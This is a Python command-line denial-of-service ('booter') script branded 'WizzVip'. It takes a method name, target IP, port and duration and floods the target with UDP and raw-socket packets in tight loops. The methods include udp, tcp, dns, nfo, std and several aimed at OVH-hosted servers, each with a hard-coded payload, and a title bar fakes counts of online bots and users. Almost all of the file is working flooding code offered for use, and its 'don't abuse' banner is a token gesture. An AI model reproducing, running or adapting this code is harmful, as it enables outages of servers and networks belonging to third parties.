#!/usr/bin/env python3
#-*- coding: utf-8 -*-
import sys
import socket
import time
import random
import threading
import getpass
import os
import urllib
import json

nicknm = "BootsVip"
attacked = """
\033[31m╦═══════════════════════════════════════════════╦
               \033[34m╦ ╦╦╔═╗╔═╗\033[33m╦  ╦╦╔═╗
               \033[34m║║║║╔═╝╔═╝\033[33m╚╗╔╝║╠═╝
               \033[34m╚╩╝╩╚═╝╚═╝\033[33m ╚╝ ╩╩  
\033[31m╩═══════════════════════════════════════════════╩
\033[34m║ \033[34mATTACKING IP PORT KENDOSS DECK?, WIZZNICH     ║ 
╩═══════════════════════════════════════════════╩
"""
pen = """
\033[34m ============================
\033[34m = WARNING DONT ABUSE TOOLS =
\033[34m ============================
"""
banner =  """
                 \033[34m╦ ╦╦╔═╗╔═╗\033[33m╦  ╦╦╔═╗
                 \033[34m║║║║╔═╝╔═╝\033[33m╚╗╔╝║╠═╝
                 \033[34m╚╩╝╩╚═╝╚═╝\033[33m ╚╝ ╩╩  
\033[35m╔╩════════════════════════╝ ╚══════════════════════════╩╗
\033[35m║    \033[32mExample How To Attack\033[93m: \033[31mMETHOD [IP] [PORT] [TIME]   \033[35m║
\033[35m╚═══════════════════════════════════════════════════════╝
\033[0mLIST
- udp    - std
- udpbps - nfo
- ovh    - ovhslav
- dns    - ovhkill
- tcp    - homeslap
"""

cookie = open(".sinfull_cookie","w+")

fsubs = 0
tpings = 0
pscans = 0
liips = 0
tattacks = 0
uaid = 0
said = 0
running = 0
iaid = 0
haid = 0
aid = 0
attack = True
ldap = True
http = True
atks = 0

def randsender(host, timer, port, punch):
	global iaid
	global aid
	global tattacks
	global running

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)

	iaid += 1
	aid += 1
	tattacks += 1
	running += 1
	while time.time() < timeout and ldap and attack:
		sock.sendto(punch, (host, int(port)))
	running -= 1
	iaid -= 1
	aid -= 1


def stdsender(host, port, timer, payload):
	global atks
	global running

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	
	atks += 1
	running += 1
	while time.time() < timeout and attack:
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
	atks -= 1
	running -= 1

def main():
	global fsubs
	global tpings
	global pscans
	global liips
	global tattacks
	global uaid
	global running
	global atk
	global ldap
	global said
	global iaid
	global haid
	global aid
	global attack
	global dp

	while True:
		bots = (random.randint(666,2109))
		sys.stdout.write("\x1b]2;VIP | Uptime: [{}] | Boots Online [10] | Online User [100] | Clients: [5]\x07".format (bots))
		sin = input("\033[34m[\033[34m{}\033[31m@VIP\033[34m]\033[32m$ \033[34m".format(nicknm)).lower()
		sinput = sin.split(" ")[0]
		if sinput == "clear":
			os.system ("clear")
			print (banner)
			print (pen)
			main()
		elif sinput == "menu":
		  os.system("clear")
		  print(banner)
		  main()
		elif sinput == "banned":
		  os.system("clear")
		  print("YOU BANNED FROM SERVER VIP")
		  time.sleep(10)
		  exit()
		elif sinput == "":
			main()
		elif sinput == "exit":
			os.system ("clear")
			exit()
		elif sinput == "ovh":
			try:
				if running >= 1:
					print("\033[34mBatas Deck")
					main()
				else:
						sinput, host, port, timer = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\x00\x02\x00\x2f"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						os.system('clear')
						print(attacked)
						time.sleep(35)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "dns":
			try:
				if running >= 1:
					print("\033[34mBatas Deck")
					main()
				else:
					sinput, host, port, timer = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('clear')
					print(attacked)
					time.sleep(35)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "udp":
			try:
				if running >= 1:
					print("\033[34mBatas Deck")
					main()
				else:
					sinput, host, port, timer = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65500
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, port, timer,punch)).start()
					os.system('clear')
					print(attacked)
					time.sleep(35)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "tcp":
			try:
				if running >= 1:
					print("\033[34mBatas Deck")
					main()
				else:
					sinput, host, port, timer = sin.split(" ")
					socket.gethostbyname(host)
					pack = 4096
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, port, timer, punch)).start()
					os.system('clear')
					print(attacked)
					time.sleep(35)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "udpbps":
			try:
				if running >= 1:
					print("\033[34mBatas Deck")
					main()
				else:
					sinput, host, port, timer = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					threading.Thread(target=randsender, args=(host, port, timer, payload)).start()
					os.system('clear')
					print(attacked)
					time.sleep(35)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovhkill":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, port, timer = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('clear')
					print(attacked)
					time.sleep(35)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovhslav":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, port, timer = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('clear')
					print(attacked)
					time.sleep(35)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "nfo":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, port, timer = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\xff\xff\xff\xff\x67\x65\x74\x63\x68\x61\x6c\x6c\x65\x6e\x67\x65\x20\x30\x20\x22"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('clear')
					print(attacked)
					time.sleep(35)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "std":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, port, timer = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x1e\x00\x01\x30\x02\xfd\xa8\xe3\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('clear')
					print(attacked)
					time.sleep(35)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "homeslap":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, port, timer = sin.split(" ")
					socket.gethostbyname(host)
					pack = 2048
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, port, timer, punch)).start()
					os.system('clear')
					print(attacked)
					time.sleep(35)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "stopattacks":
			attack = False
			while not attack:
				if aid == 0:
					attack = True
		elif sinput == "stop":
			attack = False
			while not attack:
				if aid == 0:
					attack = True

		else:
			main()


try:
	clear = "clear"
	os.system(clear)
	print(banner)
	main()
except KeyboardInterrupt:
	exit()
